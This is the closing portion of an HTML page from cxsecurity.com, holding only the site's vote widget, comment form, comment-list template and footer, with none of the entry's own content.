<button type="button" id="dodatnie" class="btn btn-success glyphicon glyphicon-thumbs-up" data-loading-text=" ... "  data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" value="2">         2</button>
<button type="button" id="ujemne" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" value="0">       0</button>
</div>
<div class="col-sm-11 col-md-5" valign="middle" id="barr">
<div class="progress progress-striped" style="margin-top: 11px;" >
<div class="progress-bar progress-bar-success active" id="dodatnieBar" data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" style="width: 100%"><div id="valGreBar">100%</div></div>
<div class="progress-bar progress-bar-danger active" id="ujemneBar" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" style="width: 0%"><div id="valRedBar">0%</div></div>
</div></div></div></div>
<div id="voteCaptcha" class="collapse">
<BR><div class="g-recaptcha" id="Recaptcha2"></div>
</div>
<div id="thanksVote">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you vote!</strong></h4></div>
</div>
<div id="thanksComm">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you comment!</strong><br>Your message is in quarantine 48 hours.</h4></div>
</div></CENTER></div></div></div>
<div id="cWlb">
<div class="well well-sm"><input name="wlb" value="2017020112" type="hidden">
<fieldset>
<legend>Comment it here.</legend>
<div class="form-group form-horizontal">
<label for="inputNick" class="col-lg-1 control-label">Nick (*)</label>
<div class="col-lg-11"><input name="n" class="form-control" id="inputNick" placeholder="Nick" style="background-color: black;" onchange="document.getElementById('commCaptcha').style.display='block';"></div></div>
<div class="form-group form-horizontal">
<label for="inputEmail" class="col-lg-1 control-label">Email (*)</label>
<div class="col-lg-11"><input name="e" class="form-control" id="inputEmail" placeholder="Email" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="inputYoutube" class="col-lg-1 control-label">Video </label>
<div class="col-lg-11"><input name="v" class="form-control" id="inputVideo" placeholder="Link to Youtube" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="textArea" class="col-lg-1 control-label">Text (*)</label>
<div class="col-lg-11">
<textarea name="c" class="form-control" rows="6" id="inputComment" style="background-color: black;"></textarea></div></div>
<div class="form-group form-horizontal">
<div class="col-lg-12" id="commCaptcha" class="collapse"><BR>
<CENTER><div id="Recaptcha1"></div><BR>
<small>(*) - <cite title="requi">required fields. </cite></small> &nbsp;
<button type="reset" class="btn btn-default" style="background-color: transparent; margin-left: 0px; margin-right: 0px;">Cancel</button>
<button type="submit" id="wysl"  style="background-color: black; margin-left: 0px; margin-right: 0px;" class="btn btn-default" onclick="comIt()">Submit</button>
</CENTER>
</div></div></fieldset></div></div>
<div ng-app="ui.bootstrap.demo" ng-controller="myCtrl">
<div ng-repeat="x in comments">
<div class="well well-sm">
<table width="100%"><TR><TD width="7%"><div ng-bind-html="x.video"></div></TD><TD style="max-width: 100%;overflow: visible;"><div align="left" class="breakcx" id="breakcx"><U><b>{{ x.nick }}</b></U> <img width="20" height="14" ng-src="https://cxsecurity.com/images/flags/{{ x.country }}.png"> | <U>Date:</U> {{ x.ux  * 1000 | date:'yyyy-MM-dd' }} <I>{{ x.ux  * 1000 | date:'HH:mm' }}</I> CET+1<HR style="padding: 0px; margin: 5px;"><DIV style="white-space: pre-wrap;">{{ x.comment }}</DIV>
</div>
</TD></TR></table>
</div>
</div><button type="button" id="shomor" class="btn btn-link btn-block" ng-click="getNextCom()">Show all comments</button></div></div></div></CENTER>
</TD></TR></TABLE>
<script>
$("#thanksComm").hide(); $("#cWLb").hide(); $("#thanksVote").hide(); $("#commCaptcha").hide();
if (localStorage.vote2017020112==1) {             
document.getElementById('voteCaptcha').style.display = 'none'; document.getElementById("dodatnie").disabled = true; document.getElementById("ujemne").disabled = true;
 }</script><HR>
Copyright <b>2021</b>, cxsecurity.com<P>&nbsp;
    </TD>
    <TD id='boki'></TD>
    <TD width="6%"></TD>
	</TR>
</TABLE>
<a href="#" class="back-to-top">Back to Top</a>
    </DIV>
    </DIV>
</BODY>
</HTML>
